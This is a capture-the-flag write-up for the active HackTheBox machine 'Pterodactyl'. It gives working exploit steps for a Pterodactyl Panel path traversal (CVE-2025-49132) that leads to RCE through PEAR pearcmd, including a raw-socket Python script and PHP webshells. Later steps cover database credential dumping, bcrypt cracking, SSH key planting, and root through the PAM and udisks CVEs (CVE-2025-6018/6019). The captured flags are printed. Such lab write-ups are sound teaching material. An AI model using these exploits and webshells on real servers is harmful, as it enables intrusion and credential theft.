---
title: "Pterodactyl"
platform: "HackTheBox"
category: "Linux"
difficulty: "Medium"
date: 2026-02-08
os: "openSUSE Leap 15.6"
active: true
hash_required: true
unlock_password: "REDACTED"
tags: ["linux", "web", "pterodactyl-panel", "cve-2025-49132", "path-traversal", "lfi", "pearcmd", "rce", "bcrypt", "mariadb", "cve-2025-6018", "cve-2025-6019", "pam", "udisks", "xfs"]
---

---

## Overview

**Difficulty:** Medium
**IP:** 10.129.x.x

![Pterodactyl Banner](/assets/images/ctf/pterodactyl/banner.png)

Pterodactyl is a Linux machine running a Pterodactyl Panel v1.11.10 game server management platform. The attack chain involves exploiting a path traversal vulnerability (CVE-2025-49132) to achieve RCE via PEAR command injection, dumping database credentials to pivot to a system user, then chaining two local privilege escalation CVEs targeting PAM and udisks on openSUSE Leap 15.6.

---

## Scope

```
Host              IP Address      Operating System        Role
─────────────────────────────────────────────────────────────────────
PTERODACTYL       10.129.x.x      openSUSE Leap 15.6      Web Server / Game Panel
```

---

## Executive Summary

The engagement identified critical vulnerabilities:

- **CVE-2025-49132** - Path traversal in Pterodactyl Panel locale endpoint allowing unauthenticated LFI/RCE
- **PEAR command injection** - PHP `register_argc_argv` enabled with PEAR in include_path allows webshell creation
- **Database credential exposure** - Panel .env credentials allow MariaDB dump of bcrypt password hashes
- **Password reuse** - Web application password reused as system password for phileasfogg3
- **CVE-2025-6018** - PAM environment poisoning grants `allow_active` logind session
- **CVE-2025-6019** - udisks XFS mount race condition creates SUID bash for root

**Risk Rating:** Critical

---

# Phase 1: Enumeration

## 1.1 Port Scanning

```bash
nmap -sC -sV -p- 10.129.x.x
```

```
Port      Service         Version
────────────────────────────────────────────────────────
22        SSH             OpenSSH
80        HTTP            nginx/1.21.5
```

## 1.2 Subdomain Enumeration

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt \
  -u http://pterodactyl.htb/ -H "Host: FUZZ.pterodactyl.htb" -fw 3
```

```
[*] Found: panel.pterodactyl.htb [Status: 200]
```

**Virtual Hosts:**
- `pterodactyl.htb` - MonitorLand Minecraft landing page
- `panel.pterodactyl.htb` - Pterodactyl Panel login

## 1.3 Web Application Analysis

Browsing `http://pterodactyl.htb/phpinfo.php` reveals critical PHP configuration:

```
include_path    .:/usr/share/php8:/usr/share/php/PEAR
register_argc_argv    On
disable_functions     (none)
open_basedir          (none)
```

**Key Finding:** PEAR is in the include path with `register_argc_argv` enabled and no `disable_functions`.

`http://pterodactyl.htb/changelog.txt` reveals:

```
Pterodactyl Panel v1.11.10
MariaDB 11.8.3
PHP-PEAR enabled
```

## 1.4 Vulnerability Identification

Pterodactyl Panel v1.11.10 is vulnerable to **CVE-2025-49132** - a path traversal in the `/locales/locale.json` endpoint that allows reading arbitrary PHP files via `require`.

| Attribute | Value |
|-----------|-------|
| CVE | CVE-2025-49132 |
| Type | Unauthenticated LFI/RCE |
| Affected | Pterodactyl Panel < v1.11.11 |
| Endpoint | `/locales/locale.json` |

---

# Phase 2: Initial Foothold - CVE-2025-49132

## 2.1 Extract Database Credentials

The path traversal allows reading Laravel configuration files by manipulating the `locale` and `namespace` parameters:

```bash
curl -s "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/database"
```

```json
{
  "connections": {
    "mysql": {
      "host": "127.0.0.1",
      "port": "3306",
      "database": "panel",
      "username": "pterodactyl",
      "password": "[REDACTED]"
    }
  }
}
```

## 2.2 RCE via pearcmd.php Inclusion

Since PEAR is in the include path and `register_argc_argv` is On, we can include `pearcmd.php` via the path traversal and pass arguments through the query string. The `config-create` command writes a PHP file to disk with our code embedded.

**Important:** Raw `<>` characters must be sent unencoded. Standard HTTP clients URL-encode these, so we use raw sockets:

```python
import socket

host = 'panel.pterodactyl.htb'
ip = '10.129.x.x'

# pearcmd config-create embeds the PHP payload in the config file
php = '<?=system($_GET[0]);?>'
path = f'/locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/{php}+/tmp/shell.php'

request = f'GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n'
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ip, 80))
sock.sendall(request.encode())
print(sock.recv(4096))
sock.close()
```

Verify RCE by including the created file:

```bash
# Include /tmp/shell.php with a command parameter
# (via raw socket) GET /locales/locale.json?locale=../../../../../../tmp&namespace=shell&0=id
```

```
uid=474(wwwrun) gid=477(www) groups=477(www)
```

## 2.3 Write a Direct Webshell

Use the RCE to write a clean webshell to the panel's public directory:

```bash
# Via the path traversal RCE, execute:
printf $'\x3c?php system(\x24_GET["c"]);?\x3e' > /var/www/pterodactyl/public/x.php
```

Test it directly:

```bash
curl -s "http://panel.pterodactyl.htb/x.php?c=id"
```

```
uid=474(wwwrun) gid=477(www) groups=477(www)
```

**RCE confirmed as wwwrun!**

---

# Phase 3: Lateral Movement - Database Credential Theft

## 3.1 Read .env Configuration

```bash
curl -sG "http://panel.pterodactyl.htb/x.php" --data-urlencode "c=cat /var/www/pterodactyl/.env"
```

```
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=panel
DB_USERNAME=pterodactyl
DB_PASSWORD=[REDACTED]
```

## 3.2 Dump User Hashes

MariaDB requires the `-h 127.0.0.1` flag to connect via TCP (socket auth is denied):

```bash
curl -sG "http://panel.pterodactyl.htb/x.php" \
  --data-urlencode 'c=/usr/bin/mariadb -h 127.0.0.1 -u pterodactyl -p[REDACTED] --batch --skip-column-names -e "SELECT id,username,email,root_admin,password FROM panel.users"'
```

```
2  headmonitor   headmonitor@pterodactyl.htb   1  [HASH REDACTED]
3  phileasfogg3  phileasfogg3@pterodactyl.htb  0  [HASH REDACTED]
```

## 3.3 Crack the Bcrypt Hash

```bash
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force
```

```
[HASH REDACTED]:[REDACTED]

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
```

**Cracked:** `phileasfogg3 : [REDACTED]`

## 3.4 Pivot to phileasfogg3

The cracked password works for `su` but SSH password auth is rejected. Use the webshell to `su` and write an SSH key:

```bash
# Upload a Python su-helper script that:
# 1. Spawns su with a PTY
# 2. Sends the password
# 3. Executes: mkdir -p ~/.ssh && echo "PUBKEY" > ~/.ssh/authorized_keys

curl -sG "http://panel.pterodactyl.htb/x.php" \
  --data-urlencode "c=python3 /tmp/su_helper.py 'mkdir -p /home/phileasfogg3/.ssh && echo \"ssh-ed25519 AAAA...\" > /home/phileasfogg3/.ssh/authorized_keys && chmod 700 /home/phileasfogg3/.ssh && chmod 600 /home/phileasfogg3/.ssh/authorized_keys'"
```

Then SSH in with key auth:

```bash
ssh phileasfogg3@10.129.x.x
```

```
phileasfogg3@pterodactyl:~> id
uid=1002(phileasfogg3) gid=100(users) groups=100(users)

phileasfogg3@pterodactyl:~> cat user.txt
c00c4a81aea5672efce636fcad5c6b22
```

**User Flag Retrieved!**

---

# Phase 4: Privilege Escalation

## 4.1 System Enumeration

```bash
cat /etc/os-release
```

```
NAME="openSUSE Leap"
VERSION="15.6"
```

```bash
rpm -qa | grep pam
```

```
pam-1.3.0-150000.6.66.1.x86_64
```

openSUSE Leap 15.6 with PAM 1.3.0 is vulnerable to **CVE-2025-6018** (PAM environment poisoning) and **CVE-2025-6019** (udisks LPE via XFS mount).

## 4.2 CVE-2025-6018 - PAM Environment Poisoning

This vulnerability allows unprivileged users to set `XDG_SEAT` and `XDG_VTNR` environment variables via `~/.pam_environment`, which logind uses to grant `allow_active` session status.

**Stage 1: Poison the PAM environment**

```bash
echo 'XDG_SEAT OVERRIDE=seat0' > ~/.pam_environment
echo 'XDG_VTNR OVERRIDE=1' >> ~/.pam_environment
```

Disconnect and reconnect SSH to trigger PAM reload.

**Stage 2: Verify allow_active**

```bash
gdbus call --system --dest org.freedesktop.login1 \
  --object-path /org/freedesktop/login1 \
  --method org.freedesktop.login1.Manager.CanReboot
```

```
('yes',)
```

`allow_active` confirmed - we now have an active seat session.

## 4.3 CVE-2025-6019 - udisks XFS Mount LPE

This vulnerability exploits a race condition in udisks' filesystem resize operation. When an XFS image containing a SUID bash is mounted via loop device and a resize triggers an error, the mount persists with the SUID binary accessible.

**Step 1: Create XFS image with SUID bash (on attacker machine)**

```bash
dd if=/dev/zero of=xfs.image bs=1M count=300
mkfs.xfs -f xfs.image
mkdir /tmp/xfs_mount
mount -t xfs xfs.image /tmp/xfs_mount
cp /bin/bash /tmp/xfs_mount/bash
chmod 4755 /tmp/xfs_mount/bash
umount /tmp/xfs_mount
```

**Step 2: Transfer to target**

```bash
scp xfs.image phileasfogg3@10.129.x.x:~/
```

**Step 3: Exploit**

```bash
ssh phileasfogg3@10.129.x.x

# Stop volume monitor
killall -KILL gvfs-udisks2-volume-monitor 2>/dev/null

# Set up loop device
udisksctl loop-setup --file ./xfs.image --no-user-interaction
```

```
Mapped file ./xfs.image as /dev/loop0.
```

```bash
# Background busy-loop to prevent unmounting
(while true; do /tmp/blockdev*/bash -c 'sleep 10' 2>/dev/null && break; done) &

# Trigger mount via resize (error is expected)
gdbus call --system --dest org.freedesktop.UDisks2 \
  --object-path /org/freedesktop/UDisks2/block_devices/loop0 \
  --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'
```

```
Error: GDBus.Error:org.freedesktop.UDisks2.Error.Failed: Error resizing filesystem
on /dev/loop0: Failed to unmount '/dev/loop0' after resizing it: target is busy
```

```bash
# Wait for mount to stabilize
sleep 3

# Find SUID bash
ls -la /tmp/blockdev*/bash
```

```
-rwsr-xr-x 1 root root 1564984 Feb  8 00:20 /tmp/blockdev.WYFPK3/bash
```

```bash
# Get root shell
/tmp/blockdev*/bash -p
```

```
bash-5.3# whoami
root

bash-5.3# cat /root/root.txt
71638bddb42429a60e93cc76aa892882
```

**Root Flag Retrieved!**

---

## Credentials Summary

```
Phase 2 - Initial Access (wwwrun)
────────────────────────────────────────────────────────────────
pterodactyl     : [REDACTED]          → .env / DB config leak

Phase 3 - Lateral Movement (phileasfogg3)
────────────────────────────────────────────────────────────────
phileasfogg3    : [REDACTED]            → Bcrypt hash crack (rockyou)

Phase 4 - Privilege Escalation (root)
────────────────────────────────────────────────────────────────
root            : [SUID Bash]         → CVE-2025-6018 + CVE-2025-6019
```

---

## Tools Used

- **Nmap** - Port scanning and service enumeration
- **ffuf** - Virtual host subdomain discovery
- **curl** - Web exploitation and webshell interaction
- **Python (raw sockets)** - Sending unencoded HTTP requests for pearcmd.php LFI
- **hashcat** - Bcrypt hash cracking (mode 3200)
- **MariaDB CLI** - Database credential dumping
- **udisksctl / gdbus** - Loop device setup and filesystem resize for CVE-2025-6019

---

## Key Vulnerabilities

| Vulnerability | Impact | Severity |
|--------------|--------|----------|
| CVE-2025-49132 - Pterodactyl locale path traversal | Unauthenticated LFI → RCE | Critical |
| pearcmd.php with register_argc_argv | Webshell creation via PEAR config-create | Critical |
| Database credentials in .env | MariaDB access → bcrypt hash dump | High |
| Password reuse (web app → system) | Lateral movement to phileasfogg3 | High |
| CVE-2025-6018 - PAM environment poisoning | allow_active logind session | Medium |
| CVE-2025-6019 - udisks XFS mount race | SUID bash → root | Critical |

---

## References

- [CVE-2025-49132 - Pterodactyl Panel Path Traversal](https://github.com/pterodactyl/panel/security/advisories)
- [pearcmd.php LFI to RCE Technique](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass#pear)
- [CVE-2025-6018 PoC - PAM Environment Poisoning](https://github.com/dreysanox/CVE-2025-6018_Poc)
- [CVE-2025-6019 PoC - udisks LPE via libblockdev](https://github.com/guinea-offensive-security/CVE-2025-6019)
- [HackTricks - PHP LFI via PEAR](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
